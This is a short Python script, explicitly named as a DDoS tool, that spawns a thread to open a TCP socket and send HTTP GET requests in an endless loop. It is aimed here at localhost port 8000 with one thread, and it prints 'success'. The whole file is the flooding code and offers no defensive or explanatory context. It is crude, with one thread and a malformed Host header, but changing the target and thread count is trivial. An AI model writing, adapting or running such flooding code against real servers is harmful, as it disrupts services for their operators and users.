import socket
import threading

def ddos(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        while True:
            sock.sendall(b"GET / HTTP/1.1\r\nHost: http://localhost\r\n\r\n")

def main():
    host = "localhost"
    port = 8000
    for i in range(1):
        threading.Thread(target=ddos, args=(host, port)).start()
        print('success......')

if __name__ == "__main__":
    main()